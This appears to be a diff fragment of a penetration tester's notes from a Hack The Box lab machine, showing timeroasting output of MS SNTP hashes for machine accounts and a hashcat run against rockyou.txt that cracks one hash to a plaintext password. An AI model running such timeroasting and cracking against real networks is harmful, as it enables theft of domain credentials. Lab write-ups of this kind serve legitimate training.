@@ -22,3 +22,72 @@ TIMEROAST   10.10.11.75     445    10.10.11.75      1124:$sntp-ms$3bc13c21ca80df
 TIMEROAST   10.10.11.75     445    10.10.11.75      1125:$sntp-ms$285e7a9c030578637343202ae658be21$1c0111e900000000000a17314c4f434cec4ee6117e2508cee1b8428bffbfcd0aec4f04a506148d55ec4f04a50614b3ec
 TIMEROAST   10.10.11.75     445    10.10.11.75      1126:$sntp-ms$19582bc0a4354f4ec24c8bf52be24af4$1c0111e900000000000a17314c4f434cec4ee6117e8567b3e1b8428bffbfcd0aec4f04a50674ede8ec4f04a5067512d1
 TIMEROAST   10.10.11.75     445    10.10.11.75      1127:$sntp-ms$a1f70dd62d7c380b6730054d2a027ac6$1c0111e900000000000a17314c4f434cec4ee6117da64eb3e1b8428bffbfcd0aec4f04a509ae5c9fec4f04a509ae924f
+
+
+┌──(batman㉿ikal)-[~/htb/hashcat-7.1.0]
+└─$ ./hashcat.bin ../l /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.0) starting in autodetect mode
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-penryn-QEMU Virtual CPU version 2.5+, 1470/2940 MB (512 MB allocatable), 4MCU
+
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+31300 | MS SNTP | Network Protocol
+
+NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+Do NOT report auto-detect issues unless you are certain of the hash type.
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 16 digests; 16 unique digests, 16 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory allocated for this attack: 513 MB (2693 MB free)
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 31300 (MS SNTP)
+Hash.Target......: ../l
+Time.Started.....: Tue Aug 19 02:20:15 2025 (11 secs)
+Time.Estimated...: Tue Aug 19 02:20:47 2025 (21 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  6966.3 kH/s (0.51ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
+Recovered........: 0/16 (0.00%) Digests (total), 0/16 (0.00%) Digests (new), 0/16 (0.00%) Salts
+Progress.........: 79364096/229510160 (34.58%)
+Rejected.........: 0/79364096 (0.00%)
+Restore.Point....: 4960256/14344385 (34.58%)
+Restore.Sub.#01..: Salt:1 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: oakvillestaples -> o1033895
+
+$sntp-ms$285e7a9c030578637343202ae658be21$1c0111e900000000000a17314c4f434cec4ee6117e2508cee1b8428bffbfcd0aec4f04a506148d55ec4f04a50614b3ec:Rusty88!
